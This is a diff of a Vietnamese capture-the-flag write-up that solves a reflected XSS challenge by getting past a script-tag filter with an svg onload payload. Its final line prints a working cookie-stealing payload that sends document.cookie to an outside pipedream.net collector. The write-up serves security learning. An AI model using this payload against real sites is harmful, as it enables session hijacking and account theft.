@@ -3,7 +3,7 @@
     http://146.190.115.228:20109
 ### Solution:
 + Mình nhập thử text `hacked` thì thấy hiện trên Dom nên mình đoán có thể là lỗi reflect:
-+ 
+
 ![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325544380_1539785776490524_506576420518357102_n.png?stp=dst-png_p403x403&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=mxRJjvm2h5sAX-IFnMw&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdShnEbKx5Gp4lBumSBFoVxAwb74bLspb0fMNVfKDYhvdw&oe=63EDEAC8)
 + Mình thử nhập `<script>alert(10)</script>` thì bị filter:
 
@@ -11,7 +11,7 @@
 + Sau mình dùng burpsuite thì thấy message in ra nằm trong thẻ div:
 
 ![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/324403300_562610902450716_1189522020715437705_n.png?stp=dst-png_p206x206&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=6yIEw5U1lVIAX9zld-t&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTY0ssYhl3oZNB1qfBO3-_ceuEbpJthnSPDJ7RMv_YsZg&oe=63EDE9DC)
-+ Mình thử dùng thẻ svg `<svg onload="alert(10)"/>` thì được thật:
++ Mình thử dùng thẻ img mà bị filter,sau mình dùng thẻ svg `<svg onload="alert(10)"/>` thì được thật:
 
 ![alt](https://scontent.xx.fbcdn.net/v/t1.15752-9/325477432_2098078310381765_4736637555871183436_n.png?stp=dst-png_s320x320&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=jKu7GXo4pP8AX9qvg-l&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSkixswTyARzDg7zpDQLwZu4b0kxf1lCMFazZyQjhCN2A&oe=63EDF35D)
 + Nên mình thử lấy cookie của máy mình `<svg onload="window.location='https://eoudjoqqnbfym00.m.pipedream.net/?cookie='.concat(document.cookie)"/>` thi get duoc cookie:
